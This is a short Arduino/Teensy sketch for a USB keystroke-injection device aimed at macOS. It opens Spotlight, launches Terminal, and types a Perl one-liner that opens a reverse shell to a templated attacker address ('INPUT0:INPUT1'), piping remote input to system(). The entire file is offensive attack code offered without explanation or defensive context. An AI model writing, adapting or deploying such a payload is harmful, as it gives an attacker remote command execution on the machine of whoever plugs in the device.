

void setup()
{
  delay(5000);
  run("terminal");
  delay(3000);
  Keyboard.print("perl -MIO -e '$p=fork;exit,if");
  delay(100);
  Keyboard.print("($p);$c=new IO::Socket::INET");
  delay(100);
  Keyboard.print("(PeerAddr,\"INPUT0:INPUT1\"");
  delay(100);
  Keyboard.print(");STDIN->fdopen($c,r);$~->");
  delay(100);
  Keyboard.print("fdopen($c,w);system$_ ");
  delay(100);
  Keyboard.println("while<>;'");
  
    
}

void loop()
{
   
}

void run(char *SomeCommand){
  
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();

  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  Keyboard.set_key1(0);
  Keyboard.send_now();
}

